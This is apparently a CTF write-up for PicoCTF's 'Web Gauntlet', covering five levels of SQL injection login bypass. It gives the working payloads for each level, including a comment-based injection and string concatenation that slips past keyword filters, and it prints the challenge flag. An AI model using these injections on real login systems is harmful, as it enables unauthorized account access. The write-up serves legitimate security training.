---
title: "Web Gauntlet"
description: "Can you beat the filters?"
date: 2025-09-09
category: "web"
author: "sealldev"
section: "PicoCTF"
tags: ["medium"]
---

Starting the challenge, we are given a login page with 5 levels:

{{< image src="/images/picoctf/webgauntlet/mainpage.png" alt="main page" >}}

# Level 1

Simple query, I try `admin` as the username and password and get back:
```
SELECT * FROM users WHERE username='admin' AND password='admin'
```

This is a SQL Injection challenge with filtering! I can see the filters on `/filter.php` and identify the current filter:
```
Round1: or
```

Let's try `admin'--` to try and login as just admin.

Success!

# Level 2
Current Filter:
```
Round2: or and like = --
```

The same payload fails for 2, what about a multi-line comment `/*`?

This works, the level is only checking some keywords and some comment detections.

Payload: `admin'/*`

# Level 3
Current Filter:
```
Round3: or and = like > < --
```

Works for level 3 too!

Still works here as those detections are not much stricter.

Payload: `admin'/*`

# Level 4
Current Filter:
```
Round4: or and = like > < -- admin
```

It seems to be detecting the keyword `admin`, so how can we break it up?

What about `ad'||'min` which split up the word?

Payload: `ad'||'min'/*`

# Level 5
Current Filter:
```
Round5: or and = like > < -- union admin
```

Same payload works again, as it's only detecting an extra filter of the word 'union' (which we don't need).

Payload: `ad'||'min'/*`

Flag: `picoCTF{y0u_m4d3_1t_79a0ddc6}`
